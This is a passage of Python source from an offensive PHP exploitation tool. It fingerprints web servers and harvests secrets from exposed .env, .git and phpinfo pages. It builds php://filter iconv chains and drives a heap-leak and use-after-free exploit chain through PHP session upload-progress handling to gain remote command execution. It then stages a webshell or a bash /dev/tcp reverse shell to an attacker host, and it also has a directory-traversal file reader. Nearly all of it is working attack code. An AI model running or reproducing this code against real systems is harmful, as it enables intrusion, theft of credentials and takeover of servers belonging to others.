    "i": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "j": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "k": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "l": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "m": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "n": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "o": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "p": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "q": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "r": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "s": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "t": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "u": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "v": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "w": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "x": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "y": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "z": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "+": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "/": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "=": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"),
}
_TAIL = "convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2"


def build_chain(php: str) -> str:
    table = CHAIN_TABLE or _PFX
    payload = base64.b64encode(php.encode()).decode()
    parts = ["convert.iconv.UTF8.CSISO2022KR", "convert.base64-encode", "convert.iconv.UTF8.UTF7"]
    for ch in reversed(payload):
        pre = table.get(ch)
        if not pre:
            raise KeyError(ch)
        parts += [f"convert.iconv.{pre[0]}.{pre[1]}", _TAIL,
                  "convert.base64-decode", "convert.base64-encode", "convert.iconv.UTF8.UTF7"]
    parts.append("convert.base64-decode")
    return "php://filter/" + "|".join(parts) + "/resource="


def load_chain_table(path: str) -> None:
    global CHAIN_TABLE
    with open(path, encoding="utf-8") as fh:
        CHAIN_TABLE = {str(k): (str(v[0]), str(v[1])) for k, v in json.load(fh).items()}


CHAIN_TABLE: dict[str, tuple[str, str]] = {}


def load_profiles(path: str) -> None:
    global PROFILES
    with open(path, encoding="utf-8") as fh:
        PROFILES = {**BUILTIN_PROFILES, **json.load(fh)}


def detect_os(t: Target, body: str, force: str = "") -> None:
    if force in ("unix", "windows"):
        t.profile.os = force
        return
    blob = body.lower()
    if any(s in blob for s in ("c:/windows", "win32", "microsoft-iis", "xampp", "wamp")):
        t.profile.os = "windows"
    elif any(s in blob for s in ("/var/www", "/etc/passwd", "ubuntu", "debian", "apache/2")):
        t.profile.os = "unix"


def detect_sapi(t: Target, hdr: dict[str, str]) -> None:
    server = (hdr.get("server", "") + " " + hdr.get("x-powered-by", "")).lower()
    for token, sapi in (("iis", "iis"), ("fpm", "fpm"), ("fastcgi", "fpm"), ("cgi", "cgi"),
                        ("litespeed", "apache"), ("apache", "apache"), ("nginx", "nginx")):
        if token in server:
            t.profile.sapi = sapi
            break
    m = re.search(r"php/(\d+\.\d+(?:\.\d+)?)", server)
    if m:
        t.profile.php = m.group(1)


FORM_RE = re.compile(rb"<form[^>]*>(.*?)</form>", re.S | re.I)
INPUT_RE = re.compile(rb"<input[^>]+>", re.I)
ATTR_RE = re.compile(rb"""([\w:-]+)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>"']+))""", re.I)
ACTION_HINTS = ("upload", "submit", "save", "import", "attach", "add")


def _attrs(tag: bytes) -> dict[bytes, bytes]:
    out: dict[bytes, bytes] = {}
    for m in ATTR_RE.finditer(tag):
        out[m.group(1).lower()] = next((g for g in m.groups()[1:] if g is not None), b"")
    return out


def parse_upload_forms(base: str, body: bytes) -> list[dict]:
    out = []
    for fm in FORM_RE.finditer(body):
        blob = fm.group(1)
        file_inputs = [i for i in INPUT_RE.finditer(blob)
                       if _attrs(i.group(0)).get(b"type", b"").lower() == b"file"]
        if not file_inputs:
            continue
        field = _attrs(file_inputs[0].group(0)).get(b"name", b"").decode("latin1")
        if not field:
            continue
        action = _attrs(fm.group(0).split(b">", 1)[0]).get(b"action", b"").decode("latin1")
        extra = {}
        for inp in INPUT_RE.finditer(blob):
            a = _attrs(inp.group(0))
            nm = a.get(b"name", b"").decode("latin1")
            if nm and nm != field and a.get(b"type", b"text").lower() in (b"hidden", b"text"):
                extra[nm] = a.get(b"value", b"").decode("latin1")
        sp = urllib.parse.urlsplit(urllib.parse.urljoin(base, action) if action else base)
        out.append({"path": sp.path + (("?" + sp.query) if sp.query else ""),
                    "field": field, "extra": extra})
    return out


def discover_upload_handlers(t: Target, words: list[str]) -> list[dict]:
    found: list[dict] = []
    for w in words:
        try:
            r = t.get(w if w.startswith("/") else "/" + w, read_cap=200_000)
        except OSError:
            continue
        if r.status not in (200, 302):
            continue
        forms = parse_upload_forms(t.base, r.body)
        if forms:
            for f in forms:
                f["source"] = "form"
                found.append(f)
        elif any(h in w.lower() for h in ACTION_HINTS) and "html" in r.ctype:
            found.append({"path": w, "field": "file", "extra": {}, "source": "guess"})
    return found


def _ini_bytes(v: str) -> int:
    m = re.fullmatch(r"\s*(\d+)\s*([kmg]?)\s*", v or "", re.I)
    if not m:
        return 0
    return int(m.group(1)) * {"": 1, "k": 1 << 10, "m": 1 << 20, "g": 1 << 30}[m.group(2).lower()]


def parse_ini(t: Target, txt: str) -> None:
    def grab(key: str) -> str:
        m = re.search(rf">{re.escape(key)}</td><td[^>]*>(.*?)</td>", txt, re.S | re.I)
        return re.sub(r"<[^>]+>", "", m.group(1)).strip() if m else ""

    p = t.profile
    p.open_basedir = grab("open_basedir")
    p.disable_functions = grab("disable_functions")
    p.allow_url_include = grab("allow_url_include").lower() in ("on", "1")
    p.memory_limit = grab("memory_limit")
    p.post_max_size = grab("post_max_size")
    if grab("allow_url_fopen"):
        p.allow_url_fopen = grab("allow_url_fopen").lower() not in ("off", "0")
    if grab("file_uploads"):
        p.file_uploads = grab("file_uploads").lower() not in ("off", "0")
    if grab("session.upload_progress.enabled"):
        p.session_progress = grab("session.upload_progress.enabled").lower() not in ("off", "0")
    if grab("session.upload_progress.cleanup"):
        p.session_cleanup = grab("session.upload_progress.cleanup").lower() not in ("off", "0")
    if grab("display_errors"):
        p.display_errors = grab("display_errors").lower() not in ("off", "0")
    if grab("session.use_strict_mode"):
        p.use_strict_mode = grab("session.use_strict_mode").lower() not in ("off", "0")
    if grab("session.upload_progress.min_freq"):
        try:
            p.min_freq = float(grab("session.upload_progress.min_freq"))
        except ValueError:
            pass
    if grab("max_input_vars").isdigit():
        p.max_input_vars = int(grab("max_input_vars"))
    p.serialize_handler = grab("session.serialize_handler") or "php"
    p.save_path = grab("session.save_path").split(";")[-1].strip()
    p.docroot = grab("DOCUMENT_ROOT")
    if p.disable_functions:
        t.note(Finding(K.LEAK, "phpinfo", f"disable_functions={p.disable_functions[:120]}"))
    if p.open_basedir:
        t.note(Finding(K.LEAK, "phpinfo", f"open_basedir={p.open_basedir}"))


def harvest_leaks(t: Target) -> None:
    seen: set[str] = set()
    for p in [t.base] + [f"{t.base.rstrip('/')}/{d}" for d in DEBUG_LEAK_PARAMS]:
        if p in seen:
            continue
        seen.add(p)
        try:
            r = t.get(p, read_cap=400_000)
        except OSError:
            continue
        if r.ok and ("phpinfo()" in r.text or "PHP Version" in r.text):
            t.note(Finding(K.LEAK, "phpinfo", p))
            t.profile.leaks.append(p)
            save_loot(t, "phpinfo.html", r.body)
            parse_ini(t, r.text)
            break
    for p in ("/.env", "/.git/config", "/composer.json"):
        try:
            r = t.get(p, read_cap=200_000)
        except OSError:
            continue
        if r.status == 200 and len(r.body) > 20:
            t.note(Finding(K.LEAK, "file", p))
            t.profile.leaks.append(p)
            save_loot(t, p.strip("/").replace("/", "_"), r.body)
            if p == "/.env":
                for line in r.text.splitlines():
                    if "=" in line and not line.startswith("#"):
                        k, _, v = line.partition("=")
                        if any(i in k.lower() for i in INTERESTING_KEYS) and len(v) > 3:
                            t.note(Finding(K.LEAK, "env", f"{k.strip()}={v.strip()[:60]}"))


# --- php2shell engine -------------------------------------------------------

def cve_state(php: str) -> str:
    m = re.fullmatch(r"(\d+)\.(\d+)\.(\d+)", php or "")
    if not m:
        return "unknown"
    maj, mino, pat = (int(x) for x in m.groups())
    if f"{maj}.{mino}" in CVE_EOL:
        return "eol"
    fixed = CVE_FIXED.get(f"{maj}.{mino}")
    if not fixed:
        return "unknown"
    return "fixed" if (mino, pat) >= fixed else "vuln"


def cve_gate(t: Target) -> tuple[str, str]:
    """Return (chain, reason). Empty chain means the CVE path is dead here."""
    p = t.profile
    if not p.session_progress:
        return "", "session.upload_progress off"
    if p.sapi == "apache":
        if not p.display_errors:
            return "", "display_errors off, no leak channel"
        return "109618", ""
    if p.sapi in ("fpm", "nginx"):
        # nginx fronting PHP is FPM in practice - mod_php never runs there.
        if p.fastcgi_buffering:
            return "", "fastcgi_request_buffering on"
        return "109619", ""
    return "", f"sapi {p.sapi}"


def fingerprint(t: Target, args) -> None:
    """Decide 109618 vs 109619 vs nothing. Everything downstream keys off this."""
    r = t.get(t.base, read_cap=400_000)
    detect_sapi(t, r.headers)
    detect_os(t, r.text, args.force_os)
    if args.force_sapi:
        t.profile.sapi = args.force_sapi
    if not t.profile.php:
        for probe in ("/phpinfo.php", "/info.php", "/test.php", "/server-status"):
            try:
                pr = t.get(probe, read_cap=300_000)
            except OSError:
                continue
            m = re.search(r"PHP Version\s*([\d.]+)", pr.text)
            if m:
                t.profile.php = m.group(1)
                parse_ini(t, pr.text)
                break
    for probe in (t.profile.leaks or []) + ["/phpinfo.php"]:
        try:
            pr = t.get(probe, read_cap=300_000)
        except OSError:
            continue
        m = re.search(r"x86_64|amd64|aarch64|arm64", pr.text, re.I)
        if m:
            t.profile.arch = "arm64" if "arm" in m.group(0).lower() else "amd64"
            break
    # buffering can only be inferred, never proven from outside: FPM behind a
    # buffering proxy will not show the stall. Treat unknown as unbuffered so
    # we at least try, and let the trigger tell us. nginx-fronted PHP is FPM
    # in practice, so it gets the same benefit of the doubt.
    if t.profile.sapi in ("fpm", "nginx") and t.profile.fastcgi_buffering:
        t.profile.fastcgi_buffering = False


def _cve_fields(t: Target) -> int:
    return max(50, min(CVE_FIELDS, max(50, t.profile.max_input_vars - 8)))


def _sid(t: Target) -> str:
    t.cookies[SID_COOKIE] = t.sid
    return t.sid


def _oom_producer(t: Target, lim: int, mult: int) -> Response | None:
    """One OOM producer: a chunked multipart body past memory_limit with the
    upload-progress callback armed. This is what leaves the worker's session
    state stale for the next request to read back. The reply is returned so
    cve_leak can mine it for the real INI values (the OOM fatal names
    memory_limit; an oversized body names post_max_size)."""
    c = Conn(t)
    try:
        bnd = ("----phpomni" + uuid4().hex).encode()
        c.send(b"POST " + t.base.encode() + b" HTTP/1.1\r\n")
        for k, v in (("Host", t.host_header()), ("User-Agent", UA),
                     ("Cookie", f"{SID_COOKIE}={t.sid}"),
                     ("Content-Type", f"multipart/form-data; boundary={bnd.decode()}"),
                     ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")):
            c.send(f"{k}: {v}\r\n".encode())
        c.send(b"\r\n")
        parts = [(b"PHP_SESSION_UPLOAD_PROGRESS", t.sid.encode()),
                 (SID_COOKIE.encode(), t.sid.encode())]
        parts += [(f"g{i}".encode(), b"v") for i in range(_cve_fields(t))]
        for name, val in parts:
            c.chunk(b"--" + bnd + b'\r\nContent-Disposition: form-data; name="'
                    + name + b'"\r\n\r\n' + val + b"\r\n")
        c.chunk(b"--" + bnd + b'\r\nContent-Disposition: form-data; name="b";'
                b' filename="b.bin"\r\nContent-Type: application/octet-stream\r\n\r\n')
        c.chunk(b"A" * (lim * mult + (2 << 20)))
        c.chunk(b"\r\n--" + bnd + b"--\r\n")
        c.chunk(b"")
        return c.read(600_000)
    except OSError:
        return None
    finally:
        c.close()


def _leak_consumer(t: Target, kind: str, forge_len: int = 79) -> Response | None:
    """Read the stale upload-progress state back as a fat Set-Cookie.

    'heap' - php2shell stage-1 groom: numeric field names plus a forged
      zend_string header (len 0x1000) that re-occupies the freed
      PS(id); the cleanup path then URL-encodes ~4KB of reclaimed heap into
      the PHPSESSID cookie, where the Zend MM chunk base can be voted out.
      forge_len is per-build: 79 on 8.4.26, 63 on every other calibrated
      build (devploit matrix).
    'lib' - stage-2 groom: a<i>[<j>] array names, so the cookie starts at
      PS(id)+0x18 and the session HashTable pDestructor (zval_ptr_dtor,
      which lives in libphp) sits at leak offset 8.
    """
    c = Conn(t)
    try:
        bnd = ("----phpomni" + uuid4().hex).encode()
        _cve_head(c, t, bnd)
        parts = [(b"PHPSESSID", t.sid.encode()),
                 (b"PHP_SESSION_UPLOAD_PROGRESS", t.sid.encode())]
        if kind == "heap":
            for i in range(841):
                parts.append((str(1000 + i).encode(),
                              (f"v{i:04d}" + "x" * 44)[:48].encode()))
            forge = bytearray(b"A" * max(0x20, forge_len))
            forge[0x10:0x18] = (0x1000).to_bytes(8, "little")
            forge[0x18] = ord("L")
            parts.append((b"1999", bytes(forge)))
        else:
            for i in range(983):
                for j in range(16 if i == 406 else 1):
                    parts.append((f"a{i:04d}[{j}]".encode(), b"x" * 16))
        for name, val in parts:
            c.chunk(b"--" + bnd + b'\r\nContent-Disposition: form-data; name="'
                    + name + b'"\r\n\r\n' + val + b"\r\n")
        c.chunk(b"--" + bnd + b"--\r\n")
        c.chunk(b"")
        return c.read(1 << 20)
    except OSError:
        return None
    finally:
        c.close()


def _cookie_leak(r: Response | None) -> bytes:
    """URL-decoded PHPSESSID leak bytes from a reply (b'' when absent)."""
    if r is None:
        return b""
    v = r.headers.get("set-cookie", "")
    if not v.startswith(SID_COOKIE + "="):
        return b""
    val = v.partition("=")[2].split(";")[0]
    try:
        # php_url_encode writes 0x20 as '+': fold it back before unquoting.
        # Lossless, because a true 0x2B byte arrives encoded as %2B.
        return urllib.parse.unquote_to_bytes(val.replace("+", "%20"))
    except (ValueError, UnicodeDecodeError):
        return b""


def _chunk_base(raw: bytes) -> int:
    """Zend MM chunk base: the most common 2MB-aligned heap pointer in the
    leak, with at least 8 votes (php2shell's proven stage-1 parse)."""
    if len(raw) < 1000:
        return 0
    votes: dict[int, int] = {}
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            key = v & ~0x1FFFFF
            votes[key] = votes.get(key, 0) + 1
    if not votes:
        return 0
    base, n = max(votes.items(), key=lambda kv: kv[1])
    return base if n >= 8 else 0


def _libphp_base(raw: bytes, dtor: int) -> int:
    """libphp base from the stale pDestructor slot at leak[8:16] (the
    stage-2 shape). The low 12 bits must match dtor and the base must come
    out page aligned, or the slot holds just another heap value."""
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if dtor and (p & 0xFFF) != (dtor & 0xFFF):
        return 0
    base = p - dtor
    return base if base & 0xFFF == 0 else 0


FATAL_LIM_RE = re.compile(r"Allowed memory size of (\d+) bytes exhausted")
POST_MAX_RE = re.compile(r"exceeds the limit of (\d+) bytes")


def _sz(n: int) -> str:
    return f"{n >> 20}M" if n >= (1 << 20) else str(n)


def _learn_config(t: Target, r: Response | None) -> str:
    """Mine a reply for the target's real INI values: the OOM fatal message
    names memory_limit exactly, and the oversized-body warning names
    post_max_size. Returns 'oom', 'warn' or '' (nothing learned)."""
    if r is None:
        return ""
    m = FATAL_LIM_RE.search(r.text)
    if m:
        t.profile.memory_limit = m.group(1)
        return "oom"
    m = POST_MAX_RE.search(r.text)
    if m:
        t.profile.post_max_size = m.group(1)
        return "warn"
    return ""


def cve_leak(t: Target, lay: Layout | None = None) -> tuple[int, int]:
    """Drive the parser into the upload-progress OOM, then read the stale
    state back through the Set-Cookie leak: first the Zend MM chunk base,
    then the libphp base. The pointers travel as raw bytes inside the
    PHPSESSID cookie (the OOB php_url_encode read), never as body text -
    display_errors only decides whether the fatal message is readable.

    The producer itself doubles as a config probe: when the OOM fires the
    fatal names the exact memory_limit (self-correcting a wrong or missing
    phpinfo value), and when no fatal ever fires the rung ladder
    (8M/32M/128M/512M) climbs until it does. A post_max_size that cannot
    fit even the smallest OOM body is reported CONFIG BLOCKED and the round
    stops instead of burning blind producers."""
    lay = lay or Layout()
    dtor = lay.dtor
    flen = lay.forge_len
    _sid(t)
    lim = _ini_bytes(t.profile.memory_limit) or (8 << 20)
    heap = 0
    oom_seen = False
    rungs = [r for r in dict.fromkeys((lim, 32 << 20, 128 << 20, 512 << 20)) if r >= lim]
    for rung in rungs:
        for mult in (1, 2, 3, 4):
            need = rung * mult + (2 << 20)
            pm = _ini_bytes(t.profile.post_max_size)
            if pm and need > pm:
                if rung + (2 << 20) > pm:
                    t.note(Finding(K.LEAK, "cve",
                                   f"post_max_size {_sz(pm)} < {_sz(rung + (2 << 20))}"
                                   " needed for the OOM body - CONFIG BLOCKED"))
                    return 0, 0
                break  # larger mults only get rejected; try the next rung
            what = _learn_config(t, _oom_producer(t, rung, mult))
            pm = _ini_bytes(t.profile.post_max_size)
            if what == "oom":
                oom_seen = True
                exact = _ini_bytes(t.profile.memory_limit)
                if exact and exact < rung:
                    rung = exact  # the fatal taught the true limit
            elif pm and rung + (2 << 20) > pm:
                t.note(Finding(K.LEAK, "cve",
                               f"post_max_size {_sz(pm)} < {_sz(rung + (2 << 20))}"
                               " needed for the OOM body - CONFIG BLOCKED"))
                return 0, 0
            raw = _cookie_leak(_leak_consumer(t, "heap", flen))
            heap = _chunk_base(raw)
            if heap:
                break
        if heap:
            break
        if oom_seen:
            break  # the OOM fired but the leak failed: not a limit problem
    if not heap:
        if not oom_seen:
            t.note(Finding(K.LEAK, "cve", "no OOM fatal up the ladder -"
                           " memory_limit above 512M, or the body is rejected"
                           " with display_errors off"))
        return 0, 0
    lim = _ini_bytes(t.profile.memory_limit) or lim
    lib = 0
    for mult in (1, 2, 3, 4):
        _learn_config(t, _oom_producer(t, lim, mult))
        raw = _cookie_leak(_leak_consumer(t, "lib", flen))
        lib = _libphp_base(raw, dtor)
        if lib:
            break
    return heap, lib


def _cve_forge(t: Target, lay: Layout, heap: int, lib: int, cmd: str) -> bytes:
    if not heap or not lib:
        return b""
    size = lay.size_for(cmd)
    arr = heap & ~0xF
    fake = bytearray(size)
    fake[lay.pdestructor:lay.pdestructor + 8] = (lib + lay.system_off).to_bytes(8, "little")
    fake[lay.ardata:lay.ardata + 8] = (arr + lay.zstring).to_bytes(8, "little")
    fake[lay.numused:lay.numused + 4] = (1).to_bytes(4, "little")
    fake[lay.zstring:lay.zstring + 4] = (1).to_bytes(4, "little")
    fake[lay.zstring + 4:lay.zstring + 8] = (6).to_bytes(4, "little")
    fake[lay.strlen:lay.strlen + 8] = (len(cmd) + 1).to_bytes(8, "little")
    fake[lay.strval:lay.strval + len(cmd)] = cmd.encode()
    return bytes(fake)


def _cve_head(c: Conn, t: Target, bnd: bytes, conn: str = "keep-alive") -> None:
    c.send(b"POST " + t.base.encode() + b" HTTP/1.1\r\n")
    for k, v in (("Host", t.host_header()), ("User-Agent", UA),
                 ("Cookie", f"{SID_COOKIE}={t.cookies.get(SID_COOKIE, t.sid)}"),
                 ("Content-Type", f"multipart/form-data; boundary={bnd.decode()}"),
                 ("Transfer-Encoding", "chunked"), ("Connection", conn)):
        c.send(f"{k}: {v}\r\n".encode())
    c.send(b"\r\n")


def cve_trigger(t: Target, lay: Layout, heap: int, lib: int, cmd: str) -> str:
    """One connection: arm, stall past min_freq, reclaim, UAF write, terminate."""
    if len(cmd) > lay.max_cmd:
        return ""
    c = Conn(t)
    try:
        bnd = ("----phpomni" + uuid4().hex).encode()
        _cve_head(c, t, bnd)
        c.chunk(b"--" + bnd + b'\r\nContent-Disposition: form-data; name="'
                b'PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n' + t.sid.encode() + b"\r\n")
        c.chunk(b"--" + bnd + b'\r\nContent-Disposition: form-data; name="b";'
                b' filename="b.bin"\r\nContent-Type: application/octet-stream\r\n\r\n')
        c.chunk(b"B" * 0x100)
        time.sleep(t.profile.min_freq + 0.35 + random.uniform(0, 0.2))
        c.chunk(_cve_forge(t, lay, heap, lib, cmd))
        c.chunk(b"\r\n--" + bnd + b"--\r\n")
        c.chunk(b"")
        return c.read(400_000).text
    finally:
        c.close()


def pin_worker(t: Target, rounds: int = 4) -> list[Conn]:
    """Hold sockets open so consecutive requests stay on one worker."""
    held = []
    for _ in range(rounds):
        try:
            held.append(Conn(t))
        except OSError:
            break
    return held


def fpm_chain(t: Target, lay: Layout, heap: int, lib: int, cmd: str) -> str:
    """109619: OOM mid-unserialize leaves BG(unserialize) dangling at level=1,
    then the next request on the same worker reclaims it."""
    held = pin_worker(t)
    if not held:
        return ""
    lim = _ini_bytes(t.profile.memory_limit) or (8 << 20)
    try:
        arm = held[0]
        _cve_head(arm, t, b"X")
        arm.chunk(b"--X\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\""
                  b"\r\n\r\n" + t.sid.encode() + b"\r\n")
        arm.chunk(b"--X\r\nContent-Disposition: form-data; name=\"b\"; filename=\"b\""
                  b"\r\n\r\n" + b"A" * (lim + (2 << 20)))
        arm.chunk(b"\r\n--X--\r\n")
        arm.chunk(b"")
        try:
            arm.read(4096)
        except OSError:
            pass
        trig = held[-1]
        _cve_head(trig, t, b"Y", "close")
        trig.chunk(b"--Y\r\nContent-Disposition: form-data; name=\"r\"\r\n\r\n"
                   + _cve_forge(t, lay, heap, lib, cmd) + b"\r\n--Y--\r\n")
        trig.chunk(b"")
        return trig.read(400_000).text
    finally:
        for c in held:
            c.close()


def _stage_write(t: Target, lay: Layout, heap: int, lib: int, data: bytes, fire) -> str | None:
    """Fallback for --cve-long off: php2shell-style one-char staging files.

    Relative names keep every command inside the 14-byte carrier:
    `echo XXXX>v` (11B), `echo XXXX>>v` (12B), `base64 -d<v>g` (13B), `sh g`.
    Returns the decoded payload name ('g') on success, None on failure.
    No per-char verification (php2shell's ~1/12 stage-3 flake is why the long
    carrier is the default) - cve_drop retries the whole write on failure.
    """
    b64 = base64.b64encode(data).decode()
    op = ">"
    for i in range(0, len(b64), 4):
        piece = b64[i:i + 4]
        if not fire(t, lay, heap, lib, f"echo {piece}{op}v"):
            return None
        op = ">>"
    if not fire(t, lay, heap, lib, "base64 -d<v>g"):
        return None
    return "g"


def cve_payload(t: Target) -> bytes:
    """What cve_drop stages through the chain.

    With a listener: a /bin/sh-compatible one-liner that echoes the marker
    (proof in the trigger response) and calls back over /dev/tcp (bash).
    Without: the PHP_EXEC webshell, which must land in a webroot and is
    verified over HTTP - running PHP under `sh` never works.
    """
    if t.lhost and t.lport:
        return (f"echo {SHELL_MARKER};"
                f"bash -c 'bash -i >& /dev/tcp/{t.lhost}/{t.lport} 0>&1'").encode()
    return PHP_EXEC.encode()


def cve_drop(t: Target, lay: Layout, heap: int, lib: int, payload: bytes, chain: str) -> str:
    b64 = base64.b64encode(payload).decode()
    php = payload.startswith(b"<?php")
    dirs = ("/var/www/html/uploads", "/var/www/html") if php else CVE_WRITE_DIRS
    fire = fpm_chain if chain == "109619" else cve_trigger
    for d in dirs:
        name = f"{d}/.o{uuid4().hex[:6]}"
        if lay.long:
            # POSIX only: `<<<` is a bashism and /bin/sh is dash on Debian
            fire(t, lay, heap, lib, f"printf %s {b64}|base64 -d>{name}")
            staged = name
        else:
            staged = _stage_write(t, lay, heap, lib, payload, fire)
            if not staged:
                continue
        if php:
            web = staged.replace("/var/www/html", "", 1) if "/" in staged else f"/{staged}"
            try:
                r = t.get(web, read_cap=40_000)
            except OSError:
                continue
            if SHELL_MARKER in r.text:
                t.note(Finding(K.SHELL, "cve", web, hard=True))
                ok(f"{t.host_header()} webshell staged at {web}")
                return web
            continue
        body = fire(t, lay, heap, lib, f"sh {staged}")
        if body and (SHELL_MARKER in body or CVE_PROOF_RE.search(body)):
            t.note(Finding(K.SHELL, "cve", name if lay.long else staged, hard=True))
            ok(f"{t.host_header()} payload staged at {name if lay.long else staged}")
            if not lay.long:
                fire(t, lay, heap, lib, "rm v")
                fire(t, lay, heap, lib, "rm g")
            return name if lay.long else staged
    return ""


def cve_prong(t: Target, cmd: str, args, chain: str) -> None:
    state = cve_state(t.profile.php)
    if state == "fixed":
        t.note(Finding(K.LEAK, "cve", f"PHP {t.profile.php} carries the 109618/9 fix"))
    lay = Layout.load(t.profile.php, t.profile.arch, args.cve_offsets)
    if not lay:
        t.note(Finding(K.LEAK, "cve", f"no layout for {t.profile.php or '?'}/{t.profile.arch}"
                                    " - run --calibrate or pass --cve-offsets"))
        return
    lay.long = args.cve_long
    if len(cmd) > lay.max_cmd:
        cmd = cmd[:lay.max_cmd]
    heap, lib = cve_leak(t, lay)
    if not heap:
        t.note(Finding(K.LEAK, "cve", "no heap leak"))
        return
    if not lib:
        t.note(Finding(K.LEAK, "cve", f"heap {heap:#x} but no libphp base"
                                    " (dtor anchor mismatch? --calibrate)"))
        return
    t.note(Finding(K.LEAK, "cve", f"heap={heap:#x} lib={lib:#x} chain={chain}"))
    ok(f"{t.host_header()} php2shell leak (chain {chain})")
    for _ in range(max(1, args.cve_rounds)):
        body = (fpm_chain if chain == "109619" else cve_trigger)(t, lay, heap, lib, cmd)
        if body and CVE_PROOF_RE.search(body):
            t.note(Finding(K.EXEC, "cve", body.strip()[:200], hard=True))
            ok(f"{t.host_header()} php2shell RCE: {cmd!r}")
            if args.stage:
                if not lay.long:
                    warn("short carrier (--no-cve-long): staging uses unverified "
                         "4-byte writes - prefer the default long carrier")
                got = cve_drop(t, lay, heap, lib, cve_payload(t), chain)
                if got:
                    t.shell_url = got
            return
        nh, nl = cve_leak(t, lay)
        heap, lib = (nh or heap), (nl or lib)
    t.note(Finding(K.LEAK, "cve", "leak ok, forge failed - recalibrate offsets"))


def calibrate(url: str, args) -> int:
    """Find system_off (the zif_system offset inside libphp) against a lab
    target: try the known builds first, then a small sweep around each."""
    t = build_target(url, args)
    try:
        fingerprint(t, args)
        harvest_leaks(t)
    except OSError as exc:
        bad(f"unreachable: {exc}")
        return 2
    chain, why = cve_gate(t)
    if not chain:
        bad(f"gate: {why}")
        return 2
    lay = Layout.load(t.profile.php, t.profile.arch, args.cve_offsets) or Layout()
    heap, lib = cve_leak(t, lay)
    if not (heap and lib):
        bad(f"leak failed (heap={heap:#x} lib={lib:#x})")
        return 1
    ok(f"leak heap={heap:#x} lib={lib:#x}")
    seeds: list[int] = []
    for cand in [lay.system_off] + [row["system_off"] for row in PROFILES.values()] + [0]:
        if cand not in seeds:
            seeds.append(cand)
    fire = fpm_chain if chain == "109619" else cve_trigger
    hits: list[int] = []
    for seed in seeds:
        window = [seed] + [o for o in range(seed - 0x400, seed + 0x408, 8) if o != seed]
        for off in window:
            lay.system_off = off
            body = fire(t, lay, heap, lib, "id")
            if CVE_PROOF_RE.search(body or ""):
                inf(f"system_off {off:#x} hit")
                hits.append(off)
                break
            nh, nl = cve_leak(t, lay)
            heap, lib = (nh or heap), (nl or lib)
        if hits:
            break
    if not hits:
        bad("no system_off hit - geometry likely wrong, try --cve-offsets")
        return 1
    row = {"system_off": hits[0], "dtor": lay.dtor, "strval": lay.strval,
           "strlen": lay.strlen, "zstring": lay.zstring, "carrier": lay.carrier,
           "forge_len": lay.forge_len}
    key = f"{t.profile.php}/{t.profile.arch}"
    out = {key: row}
    if args.profiles_out:
        with open(args.profiles_out, "w", encoding="utf-8") as fh:
            json.dump(out, fh, indent=2)
        ok(f"wrote {args.profiles_out}")
    else:
        print(json.dumps(out, indent=2))
    return 0


# --- fallback ladder --------------------------------------------------------

def session_paths(t: Target) -> list[str]:
    out = ([t.profile.save_path.rstrip("/") + "/"] if t.profile.save_path else [])
    out += ["/var/lib/php/sessions/", "/var/lib/php5/", "/var/lib/php7/", "/tmp/", "C:/Windows/Temp/"]
    return list(dict.fromkeys(out))


def lfi_read(t: Target, route: tuple[str, str], rel: str) -> bytes | None:
    page, param = route
    for wrap in (f"php://filter/convert.base64-encode/resource={rel}",
                 f"php://filter/read=convert.base64-encode/resource={rel}"):
        for v in (q(wrap), q(wrap, "/:.")):
            try:
                r = t.get2(f"{page}?{param}={v}", read_cap=600_000)
            except OSError:
                continue
            m = re.search(r"[A-Za-z0-9+/=\s]{64,}", r.text)
            if not m:
                continue
            blob = re.sub(r"\s+", "", m.group(0))
            try:
                dec = base64.b64decode(blob[: len(blob) // 4 * 4], validate=False)
            except binascii.Error:
                continue
            if len(dec) > 20:
                return dec
    return None


def discover_lfi_route(t: Target) -> tuple[str, str] | None:
    pages = [t.base] + [f"{t.base.rstrip('/')}/{p}" for p in ("index.php", "?page=home")]
    for page in pages:
        if "?" in page:
            pg, _, qs = page.partition("?")
            params = [kv.split("=")[0] for kv in qs.split("&")]
        else:
            pg, params = page, LFI_SEEDS
        for param in params:
            for depth in (1, 3, 5):
                trav = "../" * depth
                for cand in (f"{trav}etc/passwd", "/etc/passwd", f"{trav}windows/win.ini"):
                    try:
                        r = t.get2(f"{pg}?{param}={q(cand)}", read_cap=60_000)
                    except OSError:
                        continue
                    if "root:x:0:0" in r.text or "[fonts]" in r.text:
                        return (pg, param)
    return None


def lfi_prong(t: Target, cmd: str) -> None:
    route = discover_lfi_route(t)
    if not route:
        t.note(Finding(K.FAIL, "lfi", "no traversal route"))
        return
    t.route = route
    page, param = route
    t.note(Finding(K.LEAK, "lfi", f"route {page}?{param}"))
    ok(f"{t.host_header()} reads files at {page}?{param}")
